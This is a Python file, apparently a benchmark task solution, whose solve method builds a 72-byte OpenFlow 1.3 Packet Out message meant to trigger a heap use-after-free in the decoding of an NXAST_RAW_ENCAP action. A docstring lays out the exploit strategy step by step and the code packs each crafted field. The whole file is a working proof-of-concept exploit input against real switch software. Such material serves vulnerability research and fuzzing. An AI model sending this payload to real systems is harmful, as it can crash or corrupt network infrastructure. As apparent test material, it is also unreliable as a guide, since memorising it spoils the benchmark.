import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC is a 72-byte OpenFlow 1.3 Packet Out message. The vulnerability
        is a use-after-free in the decoding of an NXAST_RAW_ENCAP action.

        The exploit strategy is as follows:
        1. Craft an OpenFlow message with an actions list of a specific length (48 bytes),
           which causes the action decoder to allocate an output buffer of that same size.
        2. The actions list contains two actions:
           a) An OFPAT_SET_FIELD action (16 bytes raw). Its decoded representation
              is larger than its raw size (e.g., >24 bytes). This action is used to
              partially fill the allocated 48-byte output buffer.
           b) An NXAST_RAW_ENCAP action (32 bytes raw). The decoding of this action
              involves two steps:
              i)  A 16-byte header structure is written to the output buffer. At this
                  point, the buffer is nearly full.
              ii) The action's properties (16 bytes raw) are decoded. This involves
                  writing the 16 bytes of decoded properties to the output buffer.
                  Since the buffer has insufficient space, it is re-allocated.
        3. The function decoding NXAST_RAW_ENCAP holds a pointer to the action's
           header structure within the original output buffer. After the buffer is
           re-allocated during property decoding, this pointer becomes stale.
        4. The function then writes to this stale pointer, resulting in a
           heap-use-after-free, which is detected by ASan.
        """

        # OFPT_PACKET_OUT header (24 bytes)
        # version=4, type=13, length=72, xid=0
        # buffer_id=0xffffffff (no buffered packet)
        # in_port=0xfffffffd (OFPP_CONTROLLER)
        # actions_len=48
        header = struct.pack('>BBHIIHH6x', 4, 13, 72, 0, 0xffffffff, 0xfffffffd, 48)

        # Action 1: OFPAT_SET_FIELD (16 bytes)
        # Decoded size is >16 bytes, filling the output buffer partially.
        # - type=25, len=16
        # - oxm_header for NXM_NX_REG0: class=0x0001, field=0, hasmask=0, len=4
        # - value=0
        action1 = struct.pack('>HH I I 4x', 25, 16, 0x00010004, 0)

        # Action 2: NXAST_RAW_ENCAP (32 bytes)
        # Header (16 bytes) + Properties (16 bytes)
        
        # Header part (16 bytes)
        # - type=0xffff (OFPAT_EXPERIMENTER)
        # - len=32
        # - vendor=0x2320 (NX_VENDOR_ID)
        # - subtype=38 (NXAST_RAW_ENCAP)
        # - class_=1 (Ethernet)
        # - type=3 (NSH)
        # - present_flags=0
        # - props_len=16
        action2_header = struct.pack(
            '>HH I H H B B H',
            0xffff,          # type
            32,              # len
            0x00002320,      # vendor
            38,              # subtype
            1,               # class_
            3,               # encap type
            0,               # present_flags
            16               # props_len
        )

        # Properties part (16 bytes)
        # Decoding this will trigger the re-allocation.
        # - type=0xffff (unknown, will be copied as-is)
        # - length=16
        properties = struct.pack('>HH12x', 0xffff, 16)

        action2 = action2_header + properties

        # Final PoC
        poc = header + action1 + action2
        
        return poc
